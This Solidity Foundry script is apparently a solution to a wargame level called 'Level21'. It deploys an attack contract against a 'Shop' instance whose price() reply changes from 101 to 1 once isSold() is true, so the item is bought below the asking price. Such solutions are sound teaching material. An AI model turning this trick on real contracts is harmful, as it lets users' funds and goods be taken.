// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level21.sol";
import "forge-std/Script.sol";

contract ExploitLevel21 is Script {
    Shop instance = Shop(0x6D54C806384AF05Ca8338B8E8153D51886BBB46D);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackShop attackS = new AttackShop(instance);
        attackS.attack();
        vm.stopBroadcast();
    }
}

contract AttackShop {
    Shop instance;

    constructor(Shop _instance) {
        instance = _instance;
    }

    function attack() external {
        instance.buy();
    }

    function price() external view returns (uint256) {
        if (instance.isSold()) {
            return 1;
        }
        return 101;
    }
}
